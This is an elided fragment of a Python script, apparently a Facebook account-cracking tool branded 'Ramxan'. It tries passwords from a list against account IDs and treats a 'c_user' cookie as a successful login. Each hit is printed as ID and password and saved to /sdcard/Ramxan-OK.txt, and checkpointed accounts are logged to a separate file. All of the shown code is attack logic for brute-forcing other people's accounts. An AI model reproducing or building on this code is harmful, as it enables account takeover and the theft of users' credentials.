    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[Ramxan-OK]  ' +cid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/Ramxan-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('\33[1;35m[Ramxan-CP]  ' +cid+ ' | ' +ps+      '  \33[0;97m')

                open('/sdcard/Ramxan-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[RamXan] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
